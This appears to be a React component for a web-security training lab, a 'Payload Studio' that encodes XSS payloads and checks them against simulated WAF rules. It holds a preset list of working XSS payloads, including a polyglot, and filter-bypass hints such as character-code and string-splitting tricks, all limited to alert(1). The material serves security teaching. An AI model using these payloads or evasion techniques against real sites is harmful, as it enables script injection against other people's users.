"use client";

import { useState } from "react";
import {
  Wrench,
  Copy,
  Check,
  ShieldAlert,
  Zap,
  Sparkles,
  ArrowRight,
  Code,
  Sliders,
} from "lucide-react";

export function PayloadStudio({ labSlug }: { labSlug?: string }) {
  const [sourcePayload, setSourcePayload] = useState("<script>alert(1)</script>");
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Encoders
  const urlEncoded = encodeURIComponent(sourcePayload);
  const doubleUrlEncoded = encodeURIComponent(encodeURIComponent(sourcePayload));
  const htmlEntityDec = sourcePayload
    .split("")
    .map((c) => `&#${c.charCodeAt(0)};`)
    .join("");
  const htmlEntityHex = sourcePayload
    .split("")
    .map((c) => `&#x${c.charCodeAt(0).toString(16)};`)
    .join("");
  const base64Encoded = typeof window !== "undefined" ? btoa(sourcePayload) : "";
  const hexEncoded = sourcePayload
    .split("")
    .map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`)
    .join("");

  // WAF Simulator Rules
  const wafChecks = [
    {
      id: "script_block",
      title: "No <script> tags",
      blocked: /<script/i.test(sourcePayload),
      bypassHint: "Use <img src=x onerror=...> or <svg onload=...>",
    },
    {
      id: "quote_block",
      title: "No quotes (' or \")",
      blocked: /["']/.test(sourcePayload),
      bypassHint: "Use String.fromCharCode(88,83,83) or RegExp /XSS/.source",
    },
    {
      id: "space_block",
      title: "No whitespace characters",
      blocked: /\s/.test(sourcePayload),
      bypassHint: "Replace spaces with forward slashes: <img/src=x/onerror=alert(1)>",
    },
    {
      id: "alert_block",
      title: "No 'alert(' keyword",
      blocked: /alert\s*\(/i.test(sourcePayload),
      bypassHint: "Use confirm(), prompt(), or window['al'+'ert']()",
    },
  ];

  const quickPayloads = [
    {
      name: "Classic Script Tag",
      payload: "<script>alert(1)</script>",
      tag: "Basic",
    },
    {
      name: "Image OnError (Tag Bypass)",
      payload: "<img src=x onerror=alert(1)>",
      tag: "Filter Bypass",
    },
    {
      name: "Attribute Breakout (Quotes)",
      payload: '" onfocus="alert(1)" autofocus="',
      tag: "Context",
    },
    {
      name: "Space-Less Payload (Slash)",
      payload: "<svg/onload=alert(1)>",
      tag: "WAF Bypass",
    },
    {
      name: "Quote-Free Alert (Regex)",
      payload: "<img src=x onerror=alert(/XSS/.source)>",
      tag: "Advanced",
    },
    {
      name: "Universal Polyglot",
      payload: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
      tag: "Polyglot",
    },
  ];

  return (
    <div className="glass rounded-xl p-6 border border-cyber-700/80 space-y-6">
      <div className="flex items-center justify-between border-b border-cyber-800 pb-4">
        <div>
          <div className="flex items-center gap-2">
            <Wrench className="w-5 h-5 text-neon-yellow" />
            <h2 className="text-lg font-bold text-white">
              In-App Payload Studio & Decoder
            </h2>
            <span className="px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider bg-neon-yellow/20 text-neon-yellow border border-neon-yellow/30">
              No Burp Suite Required
            </span>
          </div>
          <p className="text-cyber-400 text-xs mt-1">
            Encode, transform, and test your payloads against simulated WAF filters without needing external proxies.
          </p>
        </div>
      </div>

      {/* Input payload */}
      <div>
        <label className="block text-xs font-semibold uppercase tracking-wider text-cyber-400 mb-2">
          Payload Crafter Input
        </label>
        <div className="flex gap-2">
          <input
            type="text"
            value={sourcePayload}
            onChange={(e) => setSourcePayload(e.target.value)}
            className="flex-1 px-4 py-3 bg-cyber-950 border border-cyber-700 rounded-lg text-white font-mono text-sm focus:outline-none focus:border-neon-yellow/60"
            placeholder="Type or paste payload to encode..."
          />
          <button
            onClick={() => copyToClipboard(sourcePayload, "raw")}
            className="px-4 py-3 bg-cyber-900 border border-cyber-700 rounded-lg text-cyber-300 hover:text-white hover:border-cyber-600 transition-all flex items-center gap-1.5 text-xs font-mono"
          >
            {copiedKey === "raw" ? (
              <Check className="w-4 h-4 text-neon-green" />
            ) : (
              <Copy className="w-4 h-4" />
            )}
            Copy
          </button>
        </div>
      </div>

      {/* Quick Payloads Presets */}
      <div>
        <label className="block text-xs font-semibold uppercase tracking-wider text-cyber-400 mb-2">
          Quick Exploit Presets
        </label>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
          {quickPayloads.map((qp, idx) => (
            <div
              key={idx}
              className="p-3 bg-cyber-900/50 border border-cyber-800 rounded-lg flex items-center justify-between hover:border-cyber-700 transition-all"
            >
              <div className="overflow-hidden pr-2">
                <div className="flex items-center gap-1.5">
                  <span className="text-xs font-medium text-white truncate">
                    {qp.name}
                  </span>
                  <span className="text-[9px] px-1.5 py-0.2 rounded bg-cyber-800 text-cyber-400 border border-cyber-700">
                    {qp.tag}
                  </span>
                </div>
                <div className="text-[11px] font-mono text-cyber-400 truncate mt-0.5">
                  {qp.payload}
                </div>
              </div>
              <div className="flex gap-1 flex-shrink-0">
                <button
                  onClick={() => setSourcePayload(qp.payload)}
                  title="Load into Crafter"
                  className="p-1.5 bg-cyber-800 hover:bg-cyber-700 text-cyber-300 rounded text-xs"
                >
                  <Sliders className="w-3.5 h-3.5" />
                </button>
                <button
                  onClick={() => copyToClipboard(qp.payload, `qp-${idx}`)}
                  title="Copy payload"
                  className="p-1.5 bg-cyber-800 hover:bg-cyber-700 text-cyber-300 rounded text-xs"
                >
                  {copiedKey === `qp-${idx}` ? (
                    <Check className="w-3.5 h-3.5 text-neon-green" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Multi-Encodings Grid */}
      <div>
        <label className="block text-xs font-semibold uppercase tracking-wider text-cyber-400 mb-2">
          Live Multi-Encoding Transformations
        </label>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {[
            { label: "URL Encoded", val: urlEncoded, key: "url" },
            { label: "Double URL Encoded", val: doubleUrlEncoded, key: "durl" },
            { label: "HTML Entity (Dec)", val: htmlEntityDec, key: "dec" },
            { label: "HTML Entity (Hex)", val: htmlEntityHex, key: "hex" },
            { label: "JavaScript Hex (\\xNN)", val: hexEncoded, key: "jshex" },
            { label: "Base64", val: base64Encoded, key: "b64" },
          ].map((item) => (
            <div
              key={item.key}
              className="p-3 bg-cyber-950/70 border border-cyber-800 rounded-lg flex items-center justify-between"
            >
              <div className="overflow-hidden pr-2">
                <span className="text-[11px] font-semibold text-cyber-400 block uppercase">
                  {item.label}
                </span>
                <span className="text-xs font-mono text-neon-yellow truncate block mt-0.5">
                  {item.val || "—"}
                </span>
              </div>
              <button
                onClick={() => copyToClipboard(item.val, item.key)}
                className="p-2 bg-cyber-900 border border-cyber-700 rounded text-cyber-400 hover:text-white hover:border-cyber-600 transition-all flex-shrink-0"
              >
                {copiedKey === item.key ? (
                  <Check className="w-3.5 h-3.5 text-neon-green" />
                ) : (
                  <Copy className="w-3.5 h-3.5" />
                )}
              </button>
            </div>
          ))}
        </div>
      </div>

      {/* WAF Simulator */}
      <div className="p-4 bg-cyber-950/80 border border-cyber-800 rounded-xl space-y-3">
        <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider text-white">
          <ShieldAlert className="w-4 h-4 text-neon-orange" />
          Simulated WAF Filter Analysis
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          {wafChecks.map((check) => (
            <div
              key={check.id}
              className={`p-3 rounded-lg border text-xs ${
                check.blocked
                  ? "bg-neon-red/10 border-neon-red/30 text-neon-red"
                  : "bg-neon-green/10 border-neon-green/30 text-neon-green"
              }`}
            >
              <div className="flex items-center justify-between font-bold mb-1">
                <span>{check.title}</span>
                <span>{check.blocked ? "BLOCKED ❌" : "BYPASSED ✅"}</span>
              </div>
              {check.blocked && (
                <p className="text-[11px] text-cyber-300 font-mono mt-1">
                  💡 Bypass: {check.bypassHint}
                </p>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
